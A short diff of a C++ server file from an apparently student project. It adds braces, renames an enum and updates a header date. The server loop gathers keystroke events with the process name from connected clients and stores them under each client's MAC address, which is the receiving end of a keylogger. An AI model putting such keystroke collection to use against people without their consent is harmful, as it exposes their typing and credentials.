@@ -5,7 +5,7 @@
 // Login   <antoine.plaskowski@epitech.eu>
 // 
 // Started on  Sat Oct 24 17:20:22 2015 Antoine Plaskowski
-// Last update Mon Oct 26 14:49:04 2015 Antoine Plaskowski
+// Last update Tue Nov  3 12:57:38 2015 Antoine Plaskowski
 //
 
 #include	"Server.hpp"
@@ -25,7 +25,7 @@ Server::Server(Option const &option) :
   m_new_istandard(m_dll_isocket.get_symbole<decltype(m_new_istandard)>(NAME_FCT_NEW_ISTANDARD)),
   m_database(m_new_idatabase()),
   m_server(m_new_iserver(option.get_host(), option.get_port())),
-  m_in(m_new_istandard(ISocket::IN)),
+  m_in(m_new_istandard(ISocket::In)),
   m_clients(),
   m_timeout(m_new_itime())
 {
@@ -54,19 +54,21 @@ bool	Server::run(void)
   for (auto it = m_clients.begin(); it != m_clients.end(); it++)
     {
       if (*it != nullptr)
-	if ((*it)->run(&m_timeout) == true)
-	  {
-	    delete *it;
-	    remove = true;
-	    *it = nullptr;
-	  }
-	else
-	  {
-	    auto ret = (*it)->get_keyboard();
+	{
+	  if ((*it)->run(&m_timeout) == true)
+	    {
+	      delete *it;
+	      remove = true;
+	      *it = nullptr;
+	    }
+	  else
+	    {
+	      auto ret = (*it)->get_keyboard();
 
-	    for (auto lol = ret.begin(); lol != ret.end(); lol++)
-	      m_database.insert_keyboard((*it)->get_mac_address(), (*lol)->time, (*lol)->event, (*lol)->key, (*lol)->process);
-	  }
+	      for (auto lol = ret.begin(); lol != ret.end(); lol++)
+		m_database.insert_keyboard((*it)->get_mac_address(), (*lol)->time, (*lol)->event, (*lol)->key, (*lol)->process);
+	    }
+	}
     }
   if (remove == true)
     m_clients.remove(nullptr);
